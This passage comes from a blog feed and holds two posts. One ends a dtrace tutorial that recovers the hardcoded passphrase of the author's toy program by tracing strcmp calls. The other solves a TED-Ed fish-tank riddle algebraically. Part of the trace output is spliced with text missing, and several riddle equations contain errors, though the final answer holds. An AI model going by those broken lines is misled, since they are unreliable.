&lt;p&gt;The way &lt;code class=&quot;highlighter-rouge&quot;&gt;dtrace&lt;/code&gt; works is that it offers problems — lots of them, actually. You can trace the probes themselves, or you can attach functions to them. I won’t really go into much detail about dtrace, there is simply too much, and I don’t understand all of it well enough yet to be able to explain it.&lt;/p&gt;

&lt;p&gt;To trace all function calls in pass, you could do:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo dtrace -F -n 'pid$target:pass::entry' -n 'pid$target:pass::return' -c &quot;./pass hello&quot;

trace: description 'pid$target:pass::entry' matched 2 probes
dtrace: description 'pid$target:pass::return' matched 2 probes
error: wrong passphrase.
dtrace: pid 54794 has exited
CPU FUNCTION
0 -&amp;gt; main
0 -&amp;gt; check
0 &amp;lt;- check
0 &amp;amp;1 | tail -n 10

0 264352 _platform_strcmp:entry __PAGEZERO __TEXT
0 264352 _platform_strcmp:entry __TEXT __TEXT
0 264352 _platform_strcmp:entry __DATA __TEXT
0 264352 _platform_strcmp:entry __LINKEDIT __TEXT
0 264352 _platform_strcmp:entry __PAGEZERO __TEXT
0 264352 _platform_strcmp:entry __TEXT __TEXT
0 264352 _platform_strcmp:entry __DATA __TEXT
0 264352 _platform_strcmp:entry __LINKEDIT __TEXT
0 264352 _platform_strcmp:entry peanuts are technically legumes hello
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And once again, from this we can tell that the ‘secret’ passphrase is &lt;em&gt;peanuts are technically legumes&lt;/em&gt;, which is easily comfirmed by running:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./pass &quot;peanuts are technically legumes&quot;
congratulations!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Being able to easily trace syscalls or library calls can be super handy when debugging. The &lt;code class=&quot;highlighter-rouge&quot;&gt;strace&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;dtruss&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ltrace&lt;/code&gt; utilities are definitely a must-have in a programmer’s toolbelt, even if many things can also be done in a debugger. DTrace however is a totally different beast. It takes some work to understand it, I &lt;em&gt;barely&lt;/em&gt; scratched the surface of what it can do, but when you do have a grasp of it I think it’s a lot more powerful than a debugger or any of the other tools, because you can hook into &lt;em&gt;anything&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;If you want to play around with the code from this article, you may get it by running&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ git clone https://gitlab.com/xfbs-blog/tracing-linux-macos.git
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Feel free to send in corrections or suggesions.&lt;/p&gt;</content><author><name>xfbs</name></author><summary type="html">If you’re coming from Linux, you may be familiar with the ptrace family of commands — strace and ltrace. If you’re coming from macOS, you may have had brief encounters with dtruss or dtrace, instead.</summary></entry><entry><title type="html">Fish Riddle</title><link href="https://blog.xfbs.net/posts/fish-riddle" rel="alternate" type="text/html" title="Fish Riddle" /><published>2017-07-26T00:00:00+02:00</published><updated>2017-07-26T00:00:00+02:00</updated><id>https://blog.xfbs.net/posts/fish-riddle</id><content type="html" xml:base="https://blog.xfbs.net/posts/fish-riddle">&lt;p&gt;The internet is full of distractions, and unfortunately, I am not always impervious to all of them. Some of them can lead to interesting results. Today, my distraction came in the shape of a riddle from a riddle from a &lt;abbr&gt;TED&lt;/abbr&gt;-Ed video, which got me to explore my (rusty, but still somewhat present) math skills.&lt;/p&gt;

&lt;style&gt;.embed-container { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%; } .embed-container iframe, .embed-container object, .embed-container embed { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }&lt;/style&gt;
&lt;div class=&quot;embed-container&quot;&gt;    &lt;iframe title=&quot;YouTube video player&quot; width=&quot;640&quot; height=&quot;390&quot; src=&quot;//www.youtube.com/embed/&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;

&lt;p&gt;Now, I was excited to learn about the puzzle to see if I could use programming (I was thinking of a constraint solver or possibly just brute-forcing it) to solve it. But alas, it turns out that it’s just solvable with plain maths 🤷🏽‍♀️. So let’s dive in and see what we can do here.&lt;/p&gt;

&lt;h2 id=&quot;the-problem&quot;&gt;The problem&lt;/h2&gt;

&lt;p&gt;You can watch the video to get the story of the puzzle, but it breaks down like this: you have three quadrants, each with a number of fish tanks and sharks in it. You know how many there are in both the first and second quadrants, and you must find out how many there are in the third quadrant.&lt;/p&gt;

&lt;p&gt;So let’s first introduce a number of variables to help is keep track of things. We define:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;script type=&quot;math/tex&quot;&gt;s_i&lt;/script&gt; as the number of creatures in sector &lt;script type=&quot;math/tex&quot;&gt;i&lt;/script&gt;,&lt;/li&gt;
  &lt;li&gt;&lt;script type=&quot;math/tex&quot;&gt;h_i&lt;/script&gt; as the number of sharks in sector &lt;script type=&quot;math/tex&quot;&gt;i&lt;/script&gt;,&lt;/li&gt;
  &lt;li&gt;&lt;script type=&quot;math/tex&quot;&gt;f_i&lt;/script&gt; as the number of fish in sector &lt;script type=&quot;math/tex&quot;&gt;i&lt;/script&gt;,&lt;/li&gt;
  &lt;li&gt;&lt;script type=&quot;math/tex&quot;&gt;t_i&lt;/script&gt; as the number of fish per tank in sector &lt;script type=&quot;math/tex&quot;&gt;i&lt;/script&gt;,&lt;/li&gt;
  &lt;li&gt;&lt;script type=&quot;math/tex&quot;&gt;n_i&lt;/script&gt; as the number of fish tanks in sector &lt;script type=&quot;math/tex&quot;&gt;i&lt;/script&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;the-constraints&quot;&gt;The constraints&lt;/h2&gt;

&lt;p&gt;There are six comstraints given in the puzzle.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;There are 50 creatures in total,&lt;/strong&gt; including sharks and fish.&lt;/li&gt;
&lt;/ol&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
\begin{array}{rcl}
f_i &amp; = &amp; n_i t_i\\
s_i &amp; = &amp; h_i f_i\\
\sum_{i=1}^{3} s_i &amp; = &amp; 50
\end{array} %]]&gt;&lt;/script&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Each sector has anywhere from one to seven sharks, with no two sectors
having the same nmber of sharks&lt;/strong&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
\begin{array}{rl}
\forall i \in \{1, 2, 3\}: &amp; 1 \leq h_i \leq 7\\
\forall i, j \in \{1, 2, 3\}: &amp; h_i \neq h_j
\end{array} %]]&gt;&lt;/script&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Each tank has an equal number of fish&lt;/strong&gt;.
&lt;em&gt;Since this is true, we will just use &lt;script type=&quot;math/tex&quot;&gt;t&lt;/script&gt; to refer to any of &lt;script type=&quot;math/tex&quot;&gt;t_i&lt;/script&gt;, simce they are all the same&lt;/em&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
\begin{array}{rl}
\forall i, j \in \{1, 2, 3\}: &amp; t_i = t_j
\end{array} %]]&gt;&lt;/script&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;In total, there are 13 or fewer fish tanks&lt;/strong&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
\begin{array}{rcl}
\sum_{i=1}^{3} n_i &amp; \leq &amp; 13
\end{array} %]]&gt;&lt;/script&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Sector Alpha has two sharks and four tanks&lt;/strong&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
\begin{array}{rcl}
h_1 &amp; = &amp; 2\\
n_1 &amp; = &amp; 4
\end{array} %]]&gt;&lt;/script&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Sector Beta has four sharks and two tanks&lt;/strong&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
\begin{array}{rcl}
h_2 &amp; = &amp; 4\\
n_2 &amp; = &amp; 2
\end{array} %]]&gt;&lt;/script&gt;

&lt;h2 id=&quot;solution&quot;&gt;Solution&lt;/h2&gt;

&lt;p&gt;The objective for us is to find both the values of &lt;script type=&quot;math/tex&quot;&gt;t&lt;/script&gt;, &lt;script type=&quot;math/tex&quot;&gt;h_3&lt;/script&gt; and &lt;script type=&quot;math/tex&quot;&gt;n_3&lt;/script&gt;. To do this, I started out by using the given constraints to find the number of possible values for each of them.&lt;/p&gt;

&lt;p&gt;Applying the given constraint #2, we can limit the search space for &lt;script type=&quot;math/tex&quot;&gt;h_3&lt;/script&gt; easily.&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
\begin{array}{rcl}
h_3 &amp; \in &amp; \{ x \in \mathbb{N} | 1 \leq x \leq 7, \forall i \in \{1, 2\}: x \neq h_i\}\\
h_3 &amp; \in &amp; \{1, 3, 5, 6, 7\}
\end{array} %]]&gt;&lt;/script&gt;

&lt;p&gt;Similarly, using the given constraint #3, we can limit the search space for &lt;script type=&quot;math/tex&quot;&gt;n_3&lt;/script&gt; easily.&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
\begin{array}{rcl}
n_3 &amp; \in &amp; \{ x \in \mathbb{N} | 0 \leq x \leq \sum_{i=1}^{2} n_i\}\\
n_3 &amp; \in &amp; \{0, 1, 2, 3, 4, 5, 6, 7\}
\end{array} %]]&gt;&lt;/script&gt;

&lt;p&gt;Finding out the search space for &lt;script type=&quot;math/tex&quot;&gt;t&lt;/script&gt; is unfortunately not that simple. First, we need to know how many creatures are currently accounted for.&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
\begin{array}{rcl}
\sum_{i=1}^{2} s_i &amp; = &amp; 6 + 6t\\
\end{array} %]]&gt;&lt;/script&gt;

&lt;p&gt;From constraint 1, we know that there are 50 creatures. Thus, from the amount of creatures we have right now and from that, we can calculate how many are not accounted for yet, &lt;script type=&quot;math/tex&quot;&gt;r&lt;/script&gt; (for &lt;em&gt;rest&lt;/em&gt;). We also know that the missing creatures must be in our sector (sector Gamma), so we have ourselves a nice simple equation.&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
\begin{array}{rcl}
r &amp; = &amp; 50 - 6 + 6t\\
r &amp; = &amp; h_3 + n_3 t\\
44 - 6t &amp; = &amp; h_3 + n_3 t\\
44 &amp; = &amp; h_3 + (6 + n_3) t
\end{array} %]]&gt;&lt;/script&gt;

&lt;p&gt;Now, given this equation and knowing the search space for both &lt;script type=&quot;math/tex&quot;&gt;h_3&lt;/script&gt; and &lt;script type=&quot;math/tex&quot;&gt;n_3&lt;/script&gt;, we can easily restrict the search space for &lt;script type=&quot;math/tex&quot;&gt;t&lt;/script&gt;. If we pop in the maximum values for &lt;script type=&quot;math/tex&quot;&gt;h_3&lt;/script&gt; and &lt;script type=&quot;math/tex&quot;&gt;n_3&lt;/script&gt; and solve it, we can find the minimum value for &lt;script type=&quot;math/tex&quot;&gt;t&lt;/script&gt;, and vice versa for the maximum value.&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
\begin{array}{rcl}
44 &amp; = &amp; 7 + (6 + 7) t_{min}\\
t_{min} &amp; \approx &amp; 3\\
44 &amp; = &amp; 1 + (6 + 0) t_{max}\\
t_{max} &amp; \approx &amp; 7
\end{array} %]]&gt;&lt;/script&gt;

&lt;p&gt;With this information, we can limit the search space for &lt;script type=&quot;math/tex&quot;&gt;t&lt;/script&gt;, because we know that it must be within the bounds of &lt;script type=&quot;math/tex&quot;&gt;t_{min}&lt;/script&gt; and &lt;script type=&quot;math/tex&quot;&gt;t_{max}&lt;/script&gt;.&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
\begin{array}{rcl}
t &amp; \in &amp; \{ x \in \mathbb{N} | t_{min} \leq x \leq t_{max}\}\\
t &amp; \in &amp; \{3, 4, 5, 6, 7\}
\end{array} %]]&gt;&lt;/script&gt;

&lt;p&gt;Now, to actually solve this whole mess, we need to rearrange our equation a little bit.&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
\begin{array}{rcl}
44 &amp; = &amp; h_3 + (6 + n_3) t\\
44 - h_3 &amp; = &amp; (6 + n_3) t
\end{array} %]]&gt;&lt;/script&gt;

&lt;p&gt;With this equation, we can see that &lt;script type=&quot;math/tex&quot;&gt;44 - h_3&lt;/script&gt; must be divisible by both &lt;script type=&quot;math/tex&quot;&gt;(6 + n_3)&lt;/script&gt; and &lt;script type=&quot;math/tex&quot;&gt;t&lt;/script&gt;. So, given that we have a list of candidates for &lt;script type=&quot;math/tex&quot;&gt;h_3&lt;/script&gt;, we can simply check their divisors and see if any of them are candidates for &lt;script type=&quot;math/tex&quot;&gt;t&lt;/script&gt;.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;script type=&quot;math/tex&quot;&gt;h_3&lt;/script&gt;&lt;/th&gt;
      &lt;th&gt;equation&lt;/th&gt;
      &lt;th&gt;&lt;script type=&quot;math/tex&quot;&gt;\{x \in \mathbb{N} \vert x \mid (44 - h_3), t_{min} \leq x \leq t_{max}\}&lt;/script&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;script type=&quot;math/tex&quot;&gt;1&lt;/script&gt;&lt;/td&gt;
      &lt;td&gt;&lt;script type=&quot;math/tex&quot;&gt;43 = (6 + n_3) t&lt;/script&gt;&lt;/td&gt;
      &lt;td&gt;&lt;script type=&quot;math/tex&quot;&gt;\{\}&lt;/script&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;script type=&quot;math/tex&quot;&gt;3&lt;/script&gt;&lt;/td&gt;
      &lt;td&gt;&lt;script type=&quot;math/tex&quot;&gt;41 = (6 + n_3) t&lt;/script&gt;&lt;/td&gt;
      &lt;td&gt;&lt;script type=&quot;math/tex&quot;&gt;\{\}&lt;/script&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;script type=&quot;math/tex&quot;&gt;5&lt;/script&gt;&lt;/td&gt;
      &lt;td&gt;&lt;script type=&quot;math/tex&quot;&gt;39 = (6 + n_3) t&lt;/script&gt;&lt;/td&gt;
      &lt;td&gt;&lt;script type=&quot;math/tex&quot;&gt;\{3\}&lt;/script&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;script type=&quot;math/tex&quot;&gt;6&lt;/script&gt;&lt;/td&gt;
      &lt;td&gt;&lt;script type=&quot;math/tex&quot;&gt;38 = (6 + n_3) t&lt;/script&gt;&lt;/td&gt;
      &lt;td&gt;&lt;script type=&quot;math/tex&quot;&gt;\{\}&lt;/script&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;script type=&quot;math/tex&quot;&gt;7&lt;/script&gt;&lt;/td&gt;
      &lt;td&gt;&lt;script type=&quot;math/tex&quot;&gt;37 = (6 + n_3) t&lt;/script&gt;&lt;/td&gt;
      &lt;td&gt;&lt;script type=&quot;math/tex&quot;&gt;\{\}&lt;/script&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Seeing that only &lt;script type=&quot;math/tex&quot;&gt;h_3 = 5&lt;/script&gt; produced a valid &lt;script type=&quot;math/tex&quot;&gt;t = 3&lt;/script&gt;, these must be our values. Now, all that is left to do is pop them right back into the equation to find &lt;script type=&quot;math/tex&quot;&gt;n_3&lt;/script&gt;.&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
\begin{array}{rcl}
39 &amp; = &amp; (6 + n_3) 3\\
21 &amp; = &amp; 3n_3\\
7 &amp; = &amp; n_3
\end{array} %]]&gt;&lt;/script&gt;

&lt;p&gt;There we go, &lt;script type=&quot;math/tex&quot;&gt;n_3 = 7&lt;/script&gt;. This means that in sector Gamma, there are five sharks and seven fish tanks. Every fish tank contains three fish.&lt;/p&gt;

&lt;p&gt;Too bad that this could be solved on paper, I’m hoping that next time I can finally get an excuse to play around with a fancy constraint solver or implement something. But in the meantime, it was fun to do and I hope I didn’t get anything wrong.&lt;/p&gt;</content><author><name>xfbs</name></author><summary type="html">The internet is full of distractions, and unfortunately, I am not always impervious to all of them. Some of them can lead to interesting results. Today, my distraction came in the shape of a riddle from a riddle from a TED-Ed video, which got me to explore my (rusty, but still somewhat present) math skills.</summary></entry></feed>